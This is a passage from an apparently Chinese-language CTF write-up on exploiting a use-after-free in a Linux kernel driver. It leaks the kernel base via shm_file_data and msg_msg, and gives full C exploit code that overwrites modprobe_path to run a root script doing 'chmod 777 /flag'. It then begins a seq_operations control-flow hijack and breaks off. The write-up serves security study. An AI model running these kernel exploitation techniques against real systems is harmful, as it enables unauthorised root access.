class="line"><span class="comment">[+] kbase = 0xffffffff81000000</span></span><br><span class="line"><span class="comment">[+] kheap = 0xffff88800ea09700</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>其大小为0x20,前8字节为NULL，并且vm_ops指向内核数据区，可以进行泄露。</p><p>申请的方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面思考的是如何利用UAF进行泄露它。容易想到的是如果我们先通过驱动获取一个shm_file_data大小的object，然后再释放它，让他放入free list。之后我们再申请合适大小的msg_msg，那么会有一个msg_msg的segment命中刚刚那个释放的free list（因为消息头大于已经大于0x20了，所以不能让消息头命中，只能通过segment命中,而且让消息头命中会破坏msg_msg结构体的list_head双链表，）。然后通过驱动把那块object再次free，然后再申请shm_file_data，那么刚刚被free的object有可能命中从而被写上shm_file_data的数据。由从而msg_msg的segment已经被改写成了shm_file_data的数据，我们直接recv掉就可以获取</p><p>那么实际上我们申请的message的总大小应该是0xfd0+(0x20-8) = 0xfe8</p><p>需要注意的一点是，<strong>利用<code>shm_file_data</code>结构体泄露完内存基址的时候，我们最好及时的将其释放</strong>。我观察到似乎进行系统调用时系统会自动将其释放，解引用了<code>struct ipc_namespace *ns</code>指针。如果后续申请到了这个object然后对其进行破坏了的话会造成缺页故障然后panic，我观察到的问题出在<code>shm_close+26</code>对某个非法的地址进行了读取操作,调试可知道其中<code>rbx</code>寄存器指向的是<code>struct ipc_namespace *ns</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff813cadd0 &lt;shm_close&gt;:      push   r14</span><br><span class="line">0xffffffff813cadd2 &lt;shm_close+2&gt;:    push   r13</span><br><span class="line">0xffffffff813cadd4 &lt;shm_close+4&gt;:    push   r12</span><br><span class="line">0xffffffff813cadd6 &lt;shm_close+6&gt;:    push   rbp</span><br><span class="line">0xffffffff813cadd7 &lt;shm_close+7&gt;:    push   rbx</span><br><span class="line">0xffffffff813cadd8 &lt;shm_close+8&gt;:    mov    rax,QWORD PTR [rdi+0xa0]</span><br><span class="line">0xffffffff813caddf &lt;shm_close+15&gt;:   mov    rbp,QWORD PTR [rax+0xc8]</span><br><span class="line">0xffffffff813cade6 &lt;shm_close+22&gt;:   mov    rbx,QWORD PTR [rbp+0x8]</span><br><span class="line">0xffffffff813cadea &lt;shm_close+26&gt;:   lea    r12,[rbx+0x1b8]</span><br></pre></td></tr></table></figure><p>释放的方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) </span><br><span class="line">    Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Analysis-解法一-任意地址写modprode-path"><a href="#Analysis-解法一-任意地址写modprode-path" class="headerlink" title="Analysis.解法一:任意地址写modprode_path"></a>Analysis.解法一:任意地址写modprode_path</h2><p>当内核没有开启slab_freelist_hardened(这是一种类似用户态下对bin中链向其他chunk进行异或加密的操作)的时候,我们可以利用double free进行任意地址写(类似tcachebin poisioning那样)，那么写哪里比较好呢？</p><p>这里介绍一个东西，叫做<code>modprode_path</code> 。当我们在内核当中安装或者卸载新模块的时候就会执行这个程序。而这个程序的路径保存在内核当中，是一个全局变量，默认为<code>/sbin/modprobe</code>,可以通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br></pre></td></tr></table></figure><p>来查看。当内核运行一个错误格式的文件(或者未知文件类型的文件)的时候也会调用这个程序，并且运行这个程序的时候是具有root权限的。</p><p>内核当中保存了这个程序的路径，而且是可以更改的。那么我们就可以更改这个路径为我们自己写的bash文件，使得运行错误文件的时候就会运行这个bash文件，进而输出flag。</p><p>如果有符号的话我们可以直接通过gdb来输出这个地址来确定偏移。</p><p><img src="https://s2.loli.net/2023/01/21/kM7D95bjavR4Tqt.png" alt=""> </p><p>如果没有的话我们可以先通过/proc/kallsyms找到__request_module的地址，然后查看汇编，就能找到对其的引用。</p><p><img src="https://s2.loli.net/2023/01/21/zBdF7PTJsheVKG2.png" alt=""></p><p>其中这个<__request_module+70>比较的地方就是modprode_path的地址</p><p><img src="https://s2.loli.net/2023/01/21/D3kCiuTZpFrBMGQ.png" alt=""></p><p>所以我们通过任意地址写就能更改这个路径，进而执行具有root权限的程序，更改flag文件的读写权限。</p><p>具体的写上链上的下个object的地址的位置(偏移offset)可以gdb看一下(不像用户态下的堆块，next_chunk地址偏移固定)</p><p>不过说实话由于不能像用户态下方便的通过pwndbg插件的命令<code>heap</code>看单链表到底长啥样，所以具体申请几次才能得到我们想要的地方还得多调试几次。在buf那打个内存断点，然后看看申请的堆块地址。</p><p><img src="https://s2.loli.net/2023/01/28/a25Y4nhZPzuwSWK.png" alt=""></p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/bad_file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27; &gt; /tmp/change_flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/bad_file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/change_flag&quot;</span>);</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span> Path_To_write =offset+ BASE+<span class="number">0x18510a0</span>;</span><br><span class="line"></span><br><span class="line">    Doing(<span class="string">&quot;Start to alloc Modepath&quot;</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> * buf = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = Path_To_write;<span class="comment">//具体offset偏移可以通过调试</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)buf,<span class="string">&quot;/tmp/change_flag&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);<span class="comment">//此时申请到的就是modprobe_path</span></span><br><span class="line">    system(<span class="string">&quot;/tmp/bad_file&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下图所示</p><p><img src="https://s2.loli.net/2023/01/28/zBYTywCIuJ3ktfR.png" alt=""></p><h2 id="Analysis-解法二-劫持控制流提权"><a href="#Analysis-解法二-劫持控制流提权" class="headerlink" title="Analysis.解法二:劫持控制流提权"></a>Analysis.解法二:劫持控制流提权</h2><p>既然有了任意次的UAF，那么我们可以考虑堆喷某些结构体然后进行劫持控制流，比如tty_struct是一个常见的用来劫持控制流的东西。</p><p>比较朴素的思路大致如下，先通过驱动申请一个合适大小的object然后释放放入freelist，然后堆喷msg_msg命中释放的object，再次free那个object造成UAF，然后再申请tty_struct这样msg_msg就能控制tty_struct。但是有个问题msg_msg的消息内容无法随意更改，这样就造成了我们无法劫持函数指针。这样我们就陷入了僵局。那么我们就必须寻求其他方式进行写，可行的办法有很多，比如利用setxattr,利用sk_buff。当然，题目在申请object的时候提供了写操作，所以我们可以直接利用它来写。但是我们并不能为了做题而做题，如果没给写的操作我们也应利用其他方法完成。这里为了学习，我把几种方法都尝试并且记录了一下</p><h3 id="PLAN1-题目提供的写操作"><a href="#PLAN1-题目提供的写操作" class="headerlink" title="PLAN1.题目提供的写操作"></a>PLAN1.题目提供的写操作</h3><h4 id="seq-operations结构体劫持控制流"><a href="#seq-operations结构体劫持控制流" class="headerlink" title="seq_operations结构体劫持控制流"></a>seq_operations结构体劫持控制流</h4><p>我选用的是<code>seq_operations</code>这个结构体来劫持控制流(我不知道<code>shm_file_data</code>是否能劫持控制流，回头可以尝试一下)，它的大小是0x20，由<code>kmalloc-32</code>申请，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们打开<code>/proc/self/stat</code>文件时，就会在内核空间分配一个<code>seq_operations</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p>当读一个stat文件时，内核会调用<code>proc_read_iter</code>指针，其默认值为<code>seq_read_iter()</code> ,有如下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">seq_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> = <span class="title">iocb</span>-&gt;<span class="title">ki_filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>也就是说会调用<code>seq_operations</code>的start指针。所以我们只要<strong>改写seq_operations-&gt;start然后读取对应文件</strong>即可劫持控制流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="comment">//... change the seq_operations-&gt;start</span></span><br><span class="line">read(seq_fd,buf,size);<span 